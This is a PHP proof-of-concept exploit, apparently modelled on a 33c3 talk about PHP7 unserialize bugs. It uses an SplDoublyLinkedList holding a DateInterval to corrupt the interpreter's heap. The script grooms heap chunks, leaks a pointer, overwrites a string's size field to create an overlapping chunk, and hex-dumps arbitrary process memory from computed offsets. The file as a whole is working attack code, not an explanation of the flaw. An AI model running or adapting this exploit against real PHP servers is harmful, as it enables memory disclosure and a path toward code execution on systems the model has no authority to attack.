<?php
// Thanks to https://media.ccc.de/v/33c3-7858-exploiting_php7_unserialize
error_reporting(E_ALL);
ini_set('display_errors', 1);

function hex_dump($data, $newline="\n")
{
  static $from = '';
  static $to = '';

  static $width = 16; # number of bytes per line

  static $pad = '.'; # padding for non-visible characters

  if ($from==='')
  {
    for ($i=0; $i<=0xFF; $i++)
    {
      $from .= chr($i);
      $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
    }
  }

  $hex = str_split(bin2hex($data), $width*2);
  $chars = str_split(strtr($data, $from, $to), $width);

  $offset = 0;
  foreach ($hex as $i => $line)
  {
    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . ']' . $newline;
    $offset += $width;
  }
}

// reserve valid heap chunks
$arr = [];
$arr[] = str_repeat("1", 23);
$arr[] = str_repeat("2", 23);
$arr[] = str_repeat("3", 23);
$arr[] = str_repeat("4", 23);
$arr[] = str_repeat("5", 23);

$spec = "P2Y4DT6H8M";
$dllist = new SplDoublyLinkedList();
$dllist->push(new DateInterval($spec));

var_dump($dllist);
var_dump($s = serialize($dllist));

var_dump($dllist->top());
$leak = $dllist->top()->y;
var_dump("bp");

$dllist->top()->y -= 0x88;
var_dump("bp");

$x = str_repeat("A", 23);
var_dump($x);

$y = str_repeat("B", 23);
var_dump($y);

// overwrite size of $x
$z = pack("QQQ", 0x0000000600000002, 0, 0x100000000000);

// now we have an overlap chunk - release valid chunks to prevent corrupted allocation
unset($arr);

$x_buf_addr = $leak-0x58;

// step 1
// zval_ptr_dtor = 0x7FF327863FE0
$leak_target = $x_buf_addr;
$leak_size = 0x100;

// step 2
$code_leak = 0x7FF327863FE0;
$leak_target = $code_leak + 0xa2caf0;
$leak_size = 16;

hex_dump(substr($x, $leak_target - $x_buf_addr, $leak_size));
?>
